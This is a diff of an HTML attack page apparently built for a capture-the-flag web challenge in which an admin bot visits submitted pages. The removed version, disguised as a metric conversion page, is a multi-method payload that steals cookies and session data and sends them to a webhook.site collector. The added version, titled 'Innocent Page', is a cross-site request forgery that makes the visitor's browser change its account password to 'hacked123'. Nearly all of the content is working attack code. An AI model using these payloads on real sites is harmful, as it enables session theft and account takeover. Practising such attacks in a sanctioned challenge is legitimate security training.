@@ -1,238 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Conversion Reference</title>
+    <title>Innocent Page</title>
 </head>
 <body>
-    <h1>Metric Conversion Reference</h1>
-    <p>Loading conversion data...</p>
+    <h1>Loading...</h1>
     
     <script>
-    var CTF_URL = 'https://azecgwzw.web.ctf.uscybergames.com/';
-    var WEBHOOK_URL = 'https://webhook.site/3f306e7a-67be-4de7-9d49-3a3dac0d0176';
-    
-    function sendToWebhook(data, type) {
-        if (!type) type = 'data';
-        var payload = {
-            type: type,
-            timestamp: new Date().toISOString(),
-            data: data
-        };
-        var encodedData = encodeURIComponent(JSON.stringify(payload));
-        return fetch(WEBHOOK_URL + '?data=' + encodedData, {
-            method: 'GET'
-        }).catch(function(webhookError) {
-            console.error('Webhook failed:', webhookError);
-        });
-    }
-
-    // Method 1: Try to read all accessible cookies (won't work for HttpOnly but worth trying)
-    function extractAccessibleCookies() {
-        var cookies = document.cookie;
-        sendToWebhook({
-            method: 'document_cookies',
-            cookies: cookies,
-            hasCookies: cookies.length > 0
-        }, 'cookie_attempt');
-    }
-
-    // Method 2: Force the bot to make a request to our server with credentials
-    // This will include the HttpOnly cookie in the request headers
-    function forceRequestWithCookies() {
-        // Create a form that submits to our controlled server
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = WEBHOOK_URL;
-        form.style.display = 'none';
-        
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'data';
-        input.value = JSON.stringify({
-            method: 'form_submission',
-            message: 'Bot submitted form with cookies',
-            userAgent: navigator.userAgent,
-            referrer: document.referrer
-        });
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-    }
-
-    // Method 3: Try to make the bot navigate to a URL we control
-    // The request will include cookies
-    function redirectToCookieCapture() {
-        // Create a URL that will capture the request with cookies
-        var captureUrl = WEBHOOK_URL + '?capture=cookies&source=' + encodeURIComponent(window.location.href);
-        
-        setTimeout(function() {
-            window.location.href = captureUrl;
-        }, 2000);
-    }
-
-    // Method 4: Try to make an image request to capture cookies
-    function imageCookieCapture() {
-        var img = new Image();
-        img.onload = function() {
-            sendToWebhook({
-                method: 'image_request',
-                message: 'Image loaded successfully'
-            }, 'cookie_attempt');
-        };
-        img.onerror = function() {
-            sendToWebhook({
-                method: 'image_request',
-                message: 'Image failed to load'
-            }, 'cookie_attempt');
-        };
-        // This will make a GET request with cookies to our server
-        img.src = WEBHOOK_URL + '?method=image&t=' + Date.now();
-    }
-
-    // Method 5: Try to create an iframe that loads our capture page
-    function iframeCookieCapture() {
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = WEBHOOK_URL + '?method=iframe&t=' + Date.now();
-        document.body.appendChild(iframe);
-        
-        setTimeout(function() {
-            sendToWebhook({
-                method: 'iframe_created',
-                message: 'Iframe created for cookie capture'
-            }, 'cookie_attempt');
-        }, 1000);
-    }
-
-    // Method 6: Try to make the bot fetch from our server
-    // This should include cookies in the request
-    function fetchToCookieCapture() {
-        fetch(WEBHOOK_URL + '?method=fetch_capture&t=' + Date.now(), {
-            method: 'GET',
-            credentials: 'include'
-        })
-        .then(function(response) {
-            sendToWebhook({
-                method: 'fetch_to_capture',
-                status: response.status,
-                message: 'Fetch to capture server completed'
-            }, 'cookie_attempt');
-        })
-        .catch(function(error) {
-            sendToWebhook({
-                method: 'fetch_to_capture',
-                error: error.message
-            }, 'cookie_attempt');
-        });
-    }
-
-    // Method 7: Try to access the session through the CTF application itself
-    // Make the bot perform actions that might reveal the session token
-    function trySessionExtraction() {
-        // Try to access any admin panels or user info endpoints
-        var endpoints = [
-            'api/profile',
-            'api/user',
-            'api/session',
-            'admin',
-            'admin/session',
-            'user/profile',
-            'auth/session',
-            'me',
-            'account'
-        ];
-        
-        endpoints.forEach(function(endpoint, index) {
-            setTimeout(function() {
-                fetch(CTF_URL + endpoint, {
-                    method: 'GET',
-                    credentials: 'include'
-                })
-                .then(function(response) {
-                    if (response.ok) {
-                        return response.text();
-                    }
-                    throw new Error('HTTP ' + response.status);
-                })
-                .then(function(data) {
-                    sendToWebhook({
-                        method: 'session_extraction',
-                        endpoint: endpoint,
-                        data: data
-                    }, 'success');
-                })
-                .catch(function(error) {
-                    sendToWebhook({
-                        method: 'session_extraction',
-                        endpoint: endpoint,
-                        error: error.message
-                    }, 'attempt');
-                });
-            }, index * 200);
-        });
-    }
-
-    // Method 8: Try to inject a script that will make requests from the CTF domain
-    function tryScriptInjection() {
-        var script = document.createElement('script');
-        script.innerHTML = `
-            // This script will run in the context of the current page
-            // Try to make requests that would include session cookies
-            fetch('${CTF_URL}api/profile', {
-                method: 'GET',
-                credentials: 'include'
+        // This will execute when the admin bot visits your page
+        fetch('https://jmacmbjf.web.ctf.uscybergames.com/api/change-password', {
+            method: 'PUT',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            credentials: 'include', // This is crucial - includes session cookies
+            body: JSON.stringify({
+                new_password: 'hacked123'
             })
-            .then(r => r.json())
-            .then(data => {
-                // Send the result to our webhook
-                fetch('${WEBHOOK_URL}?data=' + encodeURIComponent(JSON.stringify({
-                    type: 'injected_script_success',
-                    data: data
-                })));
-            })
-            .catch(err => {
-                fetch('${WEBHOOK_URL}?data=' + encodeURIComponent(JSON.stringify({
-                    type: 'injected_script_error',
-                    error: err.message
-                })));
-            });
-        `;
-        document.head.appendChild(script);
-    }
-
-    // Send initial info
-    sendToWebhook({
-        message: 'Cookie extraction payload loaded',
-        userAgent: navigator.userAgent,
-        currentURL: window.location.href,
-        domain: window.location.hostname,
-        cookies: document.cookie
-    }, 'init');
-
-    // Execute all methods
-    setTimeout(extractAccessibleCookies, 100);
-    setTimeout(imageCookieCapture, 200);
-    setTimeout(iframeCookieCapture, 300);
-    setTimeout(fetchToCookieCapture, 400);
-    setTimeout(trySessionExtraction, 500);
-    setTimeout(tryScriptInjection, 600);
-    
-    // More aggressive methods (these will leave the page)
-    setTimeout(function() {
-        sendToWebhook({
-            message: 'About to try form submission'
-        }, 'warning');
-        forceRequestWithCookies();
-    }, 3000);
-    
-    // Last resort - redirect (this will definitely leave the page)
-    setTimeout(function() {
-        sendToWebhook({
-            message: 'About to redirect for cookie capture'
-        }, 'warning');
-        redirectToCookieCapture();
-    }, 5000);
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Password changed successfully');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
     </script>
 </body>
 </html>
